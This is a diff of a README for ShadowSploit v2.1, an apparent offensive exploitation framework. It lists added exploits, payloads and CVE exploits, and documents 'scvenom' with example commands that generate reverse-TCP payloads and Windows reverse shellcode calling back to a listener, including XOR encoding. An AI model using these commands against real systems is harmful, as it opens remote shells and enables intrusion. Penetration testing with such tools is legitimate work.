@@ -5,16 +5,25 @@ see the older versions in our old github : https://github.com/singlecore06483/sc
 UPDATES
 -
 
-Changed from sc_framework to ----> shadowsploit
-
 new updates and features in ShadowSploit v2.1:
+
+- Added 15 Exploits
+- Upadted GUI
+- removed scshellcodegenerator and scpgenerator and change them to scvenom
+- Added 6 Auxiliary
+- Added 22 Payloads
+- Added 2 CVE Exploits
+- Added 5 Buffer Overflow
+- Added some banners
+- Updated the CLI
+- Fixed bugs and errors
 
 
 ShadowSploit
 -
 
-this tool uses 84 exploits and 25 cve exploits and 31 payloads and 41 auxiliary exploits.
-which some of the exploit like `ssh-loign-test, PDF-exploit, and more 82 exploits`.
+this tool uses 99 exploits and 27 cve exploits and 53 payloads and 46 auxiliary exploits.
+which some of the exploit like `ssh-loign-test, PDF-exploit, and more 97 exploits`.
 
 How this tool works?
 -
@@ -36,21 +45,6 @@ or
 python3 scconsole.py
 ```
 
--------------------------------------------------------------------------
-
-SC PAYLOAD GENERATOR
--
-
-this tool uses `5` payloads.
-
-the `scpgenerator` (sc payload generator) is a tool for generating `reverse shell payloads`.
-
-here is an example command of scpgenerator:
-
-```
-python scgenrate.py -t reverse_tcp -lh <listener_host> -lp <listener_port> -o <output_file>
-```
-
 
 -------------------------------------------------------------------------
 
@@ -58,7 +52,7 @@ ShadowSploit GUI
 -
 
 
-The `GUI` version of scconsole, that created with python, the `GUI` version haves `20 exploits`.
+The `GUI` version of scconsole, that created with python, the `GUI` version haves `40 exploits`.
 
 to run the tool, you need to run it as root with sudo, here is the command :
 
@@ -70,12 +64,34 @@ and pop up a new window that you can use scconsole as GUI version.
 
 -------------------------------------------------------------------------
 
-SC SHELLCODE GENERATOR
+SCVENOM
 -
 
-This tool generates a shellcodes for linux, macos and windows systems.
+The scvenom is a payload and shellcode generator for shadowsploit.
 
-use this tool to generate a shellcode.
+you can generate windows/mac/linux shellcodes and payloads.
+
+here some examples of scvenom : 
+
+to see the usable payloads:
+```
+./scvenom.py --list
+```
+
+to generate payload:
+```
+./scvenom.py -p python/reverse_tcp LHOST=10.2.3.4 LPORT=4444 -f py -o payload.py --one-liner
+
+./scvenom.py -p python/reverse_tcp LHOST=10.2.3.4 LPORT=4444 -o payload.py
+
+./scvenom.py -p python/reverse_tcp LHOST=10.2.3.4 LPORT=4444 -o payload.py --xor 255
+```
+
+to generate shellcode:
+```
+./scvenom -p windows/reverse_shellcode LHOST=10.2.3.4 LPORT=4444 -o shellcode.bin
+```
+
 
 -------------------------------------------------------------------------
 
